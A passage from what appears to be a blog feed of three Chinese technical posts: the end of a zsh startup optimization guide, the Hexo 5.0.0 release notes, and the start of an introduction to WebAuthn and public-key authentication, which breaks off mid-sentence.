class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 